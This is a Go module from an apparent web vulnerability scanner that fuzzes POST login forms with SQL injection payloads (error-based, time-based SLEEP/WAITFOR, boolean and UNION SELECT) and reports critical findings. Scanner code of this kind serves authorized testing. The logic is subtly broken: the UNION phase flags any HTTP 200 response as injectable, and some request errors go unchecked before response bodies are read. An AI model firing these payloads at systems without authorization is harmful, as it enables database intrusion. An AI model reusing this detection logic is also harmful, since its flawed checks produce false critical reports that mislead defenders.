package activescan

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/mijelblack677-ctrl/aegis/internal/modules"
	"github.com/mijelblack677-ctrl/aegis/internal/output"
)

type AdvancedLoginSQLiFuzzer struct{}

func NewAdvancedLoginSQLiFuzzer() *AdvancedLoginSQLiFuzzer {
	return &AdvancedLoginSQLiFuzzer{}
}

func (a *AdvancedLoginSQLiFuzzer) Name() string    { return "advanced_login_sqli" }
func (a *AdvancedLoginSQLiFuzzer) IsPassive() bool { return false }

func (a *AdvancedLoginSQLiFuzzer) Run(pair *modules.RequestResponsePair) ([]*output.Vulnerability, error) {
	var vulns []*output.Vulnerability

	if !isLoginEndpoint(pair.Request.URL.String(), pair.Request.URL.Path) {
		return vulns, nil
	}
	if pair.Request.Method != "POST" {
		return vulns, nil
	}

	urlStr := pair.Request.URL.String()
	client := &http.Client{Timeout: 15 * time.Second}

	// PHASE 1: Error-based detection
	errorPayloads := []string{
		"'",
		"\"",
		"')",
		"\"'",
		"\\",
		"' OR '1'='1",
		"1' AND 1=1--",
		"1' AND 1=2--",
	}

	for _, payload := range errorPayloads {
		body := buildFormBody(pair.RequestBody, payload)
		req, _ := http.NewRequest("POST", urlStr, bytes.NewReader(body))
		copyHeaders(pair.Request, req)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		respBody, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		bodyStr := string(respBody)
		// Check for SQL error leakage
		sqlErrors := []string{
			"SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL",
			"SQLite", "unclosed quotation mark", "near \"",
			"syntax error", "SQLSTATE", "Warning: mysql",
		}
		for _, errStr := range sqlErrors {
			if strings.Contains(strings.ToLower(bodyStr), strings.ToLower(errStr)) {
				vulns = append(vulns, &output.Vulnerability{
					Name:        "SQL Injection - Error-Based (Database Error Leaked)",
					Description: fmt.Sprintf("SQL error leaked in response: '%s'. This confirms SQL injection vulnerability.", errStr),
					Severity:    output.SeverityCritical,
					URL:         urlStr,
					Evidence: output.Evidence{
						Response:       bodyStr[:min(500, len(bodyStr))],
						ProofOfConcept: fmt.Sprintf("Payload '%s' triggered SQL error", payload),
					},
					Remediation: "Use parameterized queries. Never display SQL errors to users.",
					Tags:        []string{"sqli", "error-based", "critical", "goldmine"},
				})
				return vulns, nil
			}
		}
	}

	// PHASE 2: Time-based blind detection
	timePayloads := []string{
		"' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
		"' AND SLEEP(3)--",
		"'; SELECT SLEEP(3)--",
		"1' WAITFOR DELAY '0:0:3'--",
		"' OR (SELECT(SLEEP(3)))--",
	}

	for _, payload := range timePayloads {
		body := buildFormBody(pair.RequestBody, payload)
		req, _ := http.NewRequest("POST", urlStr, bytes.NewReader(body))
		copyHeaders(pair.Request, req)

		start := time.Now()
		resp, err := client.Do(req)
		elapsed := time.Since(start)
		if resp != nil {
			resp.Body.Close()
		}

		if err == nil && elapsed > 2*time.Second {
			vulns = append(vulns, &output.Vulnerability{
				Name:        "SQL Injection - Time-Based Blind",
				Description: fmt.Sprintf("Time-based SQL injection confirmed. Response delayed by %v.", elapsed),
				Severity:    output.SeverityCritical,
				URL:         urlStr,
				Evidence: output.Evidence{
					ProofOfConcept: fmt.Sprintf("Payload '%s' caused %v delay", payload, elapsed),
				},
				Remediation: "Use parameterized queries with prepared statements.",
				Tags:        []string{"sqli", "time-based", "blind", "critical", "goldmine"},
			})
			return vulns, nil
		}
	}

	// PHASE 3: Boolean-based blind detection
	truePayload := "admin' AND 1=1--"
	falsePayload := "admin' AND 1=2--"

	trueReq, _ := http.NewRequest("POST", urlStr, bytes.NewReader(buildFormBody(pair.RequestBody, truePayload)))
	copyHeaders(pair.Request, trueReq)
	trueResp, _ := client.Do(trueReq)
	trueBody, _ := io.ReadAll(trueResp.Body)
	trueResp.Body.Close()

	falseReq, _ := http.NewRequest("POST", urlStr, bytes.NewReader(buildFormBody(pair.RequestBody, falsePayload)))
	copyHeaders(pair.Request, falseReq)
	falseResp, _ := client.Do(falseReq)
	falseBody, _ := io.ReadAll(falseResp.Body)
	falseResp.Body.Close()

	if len(trueBody) != len(falseBody) || trueResp.StatusCode != falseResp.StatusCode {
		vulns = append(vulns, &output.Vulnerability{
			Name:        "SQL Injection - Boolean-Based Blind",
			Description: "Boolean-based SQL injection detected. Different responses for true/false conditions.",
			Severity:    output.SeverityCritical,
			URL:         urlStr,
			Evidence: output.Evidence{
				ProofOfConcept: "True condition returned different response than false condition",
			},
			Remediation: "Use parameterized queries.",
			Tags:        []string{"sqli", "boolean-based", "blind", "critical", "goldmine"},
		})
		return vulns, nil
	}

	// PHASE 4: UNION-based detection
	unionPayloads := []string{
		"' UNION SELECT 1,2,3,4,5--",
		"' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
		"1' UNION SELECT 1,'test','test',4,5--",
	}

	for _, payload := range unionPayloads {
		body := buildFormBody(pair.RequestBody, payload)
		req, _ := http.NewRequest("POST", urlStr, bytes.NewReader(body))
		copyHeaders(pair.Request, req)

		resp, _ := client.Do(req)
		respBody, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		// Check if UNION worked (response contains injected values)
		if strings.Contains(string(respBody), "test") || resp.StatusCode == 200 {
			vulns = append(vulns, &output.Vulnerability{
				Name:        "SQL Injection - UNION-Based",
				Description: "UNION-based SQL injection detected. Injected values reflected in response.",
				Severity:    output.SeverityCritical,
				URL:         urlStr,
				Evidence: output.Evidence{
					ProofOfConcept: fmt.Sprintf("UNION payload: %s", payload),
				},
				Remediation: "Use parameterized queries.",
				Tags:        []string{"sqli", "union-based", "critical", "goldmine"},
			})
			return vulns, nil
		}
	}

	return vulns, nil
}

func buildFormBody(originalBody []byte, sqliPayload string) []byte {
	if len(originalBody) == 0 {
		return []byte(fmt.Sprintf("username=admin&password=%s", sqliPayload))
	}
	params, err := url.ParseQuery(string(originalBody))
	if err != nil {
		return originalBody
	}
	// Inject into password field (or last field)
	params.Set("password", sqliPayload)
	return []byte(params.Encode())
}
